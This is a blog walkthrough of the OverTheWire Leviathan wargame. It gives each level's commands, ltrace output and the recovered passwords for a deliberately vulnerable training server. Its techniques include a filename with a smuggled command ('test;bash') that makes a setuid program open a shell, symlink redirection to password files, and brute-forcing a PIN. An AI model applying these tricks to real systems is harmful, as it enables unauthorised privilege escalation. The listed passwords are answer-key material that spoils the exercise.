---
layout: post
title: OverTheWire Leviathan
date: 2017-03-01
tags: [OverTheWire]
---

# Level 0

>   To login to the first level use:
>
>   ```
>   Username: leviathan0
>   Password: leviathan0
>   ```
>
>   Data for the levels can be found in **the homedirectories** . You can look at **/etc/leviathan_pass** for the various level passwords.
>

```bash
sshpass -p leviathan0 ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```

```bash
leviathan0@leviathan:~$ ls
leviathan0@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan0@leviathan:~$ cd .backup/
leviathan0@leviathan:~/.backup$ ls
bookmarks.html
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```


# Level 1

```bash
sshpass -p rioGegei8m ssh leviathan1@leviathan.labs.overthewire.org -p 2223
```

```bash
leviathan1@leviathan:~$ ls
check
leviathan1@leviathan:~$ file check
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c735f6f3a3a94adcad8407cc0fda40496fd765dd, not stripped
leviathan1@leviathan:~$ ./check
password: password
Wrong password, Good Bye ...
leviathan1@leviathan:~$ strings check # nothing much was found
leviathan1@leviathan:~$ ltrace ./check
__libc_start_main(0x804853b, 1, 0xffffd784, 0x8048610 <unfinished ...>
printf("password: ")                                                      = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: password
)                                     = 112
getchar(1, 0, 0x65766f6c, 0x646f6700)                                     = 97
getchar(1, 0, 0x65766f6c, 0x646f6700)                                     = 115
strcmp("pas", "sex")                                                      = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                      = 29
+++ exited (status 0) +++
leviathan1@leviathan:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```


# Level 2

```bash
sshpass -p ougahZi8Ta ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```

```bash
leviathan2@leviathan:~$ ls
printfile
leviathan2@leviathan:~$ ls -l
total 8
-r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
leviathan2@leviathan:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Weird.. why can't we access the password even though we can run as ``leviathan3``? Let's run ``ltrace`` to check out what's in the script.

```bash
leviathan2@leviathan:~$ ltrace ./printfile
__libc_start_main(0x804852b, 1, 0xffffd784, 0x8048610 <unfinished ...>
puts("*** File Printer ***"*** File Printer ***
)                                              = 21
printf("Usage: %s filename\n", "./printfile"Usage: ./printfile filename
)                             = 28
+++ exited (status 255) +++
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                               = -1
puts("You cant have that file..."You cant have that file...
)                                        = 27
+++ exited (status 1) +++
```

It seems like the script takes a filename as input and then calls ``access()`` to check if it has the permissions to read that file. Then, it creates a string using ``sprintf("/bin/cat %s", filename)`` and then elevates the id.

What if we create a new file as a string literal called ``"test;bash"`` to trick the system into running a fake command, then elevate itself and thereafter run bash?

```bash
leviathan2@leviathan:~$ mkdir /tmp/shiro
leviathan2@leviathan:~$ cd /tmp/shiro
leviathan2@leviathan:/tmp/shiro$ touch "test;bash"
leviathan2@leviathan:/tmp/shiro$ ls
test;bash
leviathan2@leviathan:/tmp/shiro$ ~/printfile "test;bash"
/bin/cat: test: No such file or directory
leviathan3@leviathan:~$ cat /etc/leviathan_pass/leviathan3
Ahdiemoo1j
```

***Alternative Solution***

When we read the ``ltrace`` output, we realize that the ``/bin/cat`` command uses just the first part of the filename. Therefore, we can exploit this by creating a file that has a space in it to make the ``/bin/cat`` command read it as 2 separate files. Thereafter, we link the second file to the password location using a symbolic link ``ln -s <original file> <fake file>``

```bash
leviathan2@leviathan:~$ mkdir /tmp/shiro
leviathan2@leviathan:~$ echo "hi" >> /tmp/shiro/test.txt
leviathan2@leviathan:~$ ./printfile /tmp/shiro/test.txt
hi
leviathan2@leviathan:~$ ltrace ./printfile /tmp/shiro/test.txt
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/tmp/shiro/test.txt", 4)                                          = 0
snprintf("/bin/cat /tmp/shiro/test.txt", 511, "/bin/cat %s", "/tmp/shiro/test.txt") = 28
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat /tmp/shiro/test.txt"hi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
leviathan2@leviathan:~$ echo "hi 2" >> /tmp/shiro/"test 2".txt # you can also do test\ 2.txt
leviathan2@leviathan:~$ ./printfile /tmp/shiro/"test 2".txt
/bin/cat: /tmp/shiro/test: No such file or directory
/bin/cat: 2.txt: No such file or directory
leviathan2@leviathan:~$ ltrace ./printfile /tmp/shiro/"test 2".txt
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/tmp/shiro/test 2.txt", 4)                                        = 0
snprintf("/bin/cat /tmp/shiro/test 2.txt", 511, "/bin/cat %s", "/tmp/shiro/test 2.txt") = 30
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat /tmp/shiro/test 2.txt"/bin/cat: /tmp/shiro/test: No such file or directory # we notice here that it tried to read a file called test but there is no such file (so let's link this to the password file)
/bin/cat: 2.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 256
+++ exited (status 0) +++
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/shiro/test
leviathan2@leviathan:~$ ./printfile /tmp/shiro/"test 2".txt
Ahdiemoo1j
/bin/cat: 2.txt: No such file or directory
```


# Level 3

```bash
sshpass -p Ahdiemoo1j ssh leviathan3@leviathan.labs.overthewire.org -p 2223
```

```bash
leviathan3@leviathan:~$ ls
level3
leviathan3@leviathan:~$ ls -l
total 12
-r-sr-x--- 1 leviathan4 leviathan3 10288 Aug 26  2019 level3
leviathan3@leviathan:~$ ./level3
Enter the password> password
bzzzzzzzzap. WRONG
leviathan3@leviathan:~$ ltrace ./level3
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                = -1 
printf("Enter the password> ")                                            = 20
fgets(Enter the password> password
"password\n", 256, 0xf7fc55a0)                                      = 0xffffd590
strcmp("password\n", "snlprintf\n")                                       = -1 # we are comparing the actual password here
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                = 19
+++ exited (status 0) +++
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```


# Level 4

```bash
sshpass -p vuH0coox6m ssh leviathan4@leviathan.labs.overthewire.org -p 2223
```

```bash
leviathan4@leviathan:~$ ls
leviathan4@leviathan:~$ ls -la
total 24
drwxr-xr-x  3 root root       4096 Aug 26  2019 .
drwxr-xr-x 10 root root       4096 Aug 26  2019 ..
-rw-r--r--  1 root root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root root       3526 May 15  2017 .bashrc
-rw-r--r--  1 root root        675 May 15  2017 .profile
dr-xr-x---  2 root leviathan4 4096 Aug 26  2019 .trash
leviathan4@leviathan:~$ cd .trash/
leviathan4@leviathan:~/.trash$ ls
bin
leviathan4@leviathan:~/.trash$ ls -l bin
-r-sr-x--- 1 leviathan5 leviathan4 7352 Aug 26  2019 bin
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
```

Seems like its a binary message. Let's use a binary to text [convertor](https://www.rapidtables.com/convert/number/binary-to-ascii.html) to get the message.

``Tith4cokei``


# Level 5

```bash
sshpass -p Tith4cokei ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

```bash
leviathan5@leviathan:~$ ls
leviathan5
leviathan5@leviathan:~$ ls -l leviathan5
-r-sr-x--- 1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                               = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                         = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

What happens if we create a file inside ``/tmp/file.log``?

```bash
leviathan5@leviathan:~$ ls /tmp/file.log
ls: cannot access '/tmp/file.log': No such file or directory
leviathan5@leviathan:~$ echo "hi" > /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
hi
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
```

Interesting.. It seems that the script will read the file and then deletes it. Can we then create a file in ``/tmp/file.log`` and then use the symbolic link to link the file to the password file?

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
UgaoFee4li
```


# Level 6

```bash
sshpass -p UgaoFee4li ssh leviathan6@leviathan.labs.overthewire.org -p 2223
```

```bash
leviathan6@leviathan:~$ ls
leviathan6
leviathan6@leviathan:~$ ls -l
total 8
-r-sr-x--- 1 leviathan7 leviathan6 7452 Aug 26  2019 leviathan6
leviathan6@leviathan:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@leviathan:~$ for i in {0000..9999}; do echo $i; ./leviathan6 $i; done
.
.
.
.
.
Wrong
7120
Wrong
7121
Wrong
7122
Wrong
7123
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```


# Level 7

```bash
sshpass -p ahy7MaeBo9 ssh leviathan7@leviathan.labs.overthewire.org -p 2223
```

```bash
leviathan7@leviathan:~$ ls
CONGRATULATIONS
leviathan7@leviathan:~$ file CONGRATULATIONS
CONGRATULATIONS: ASCII text
leviathan7@leviathan:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```
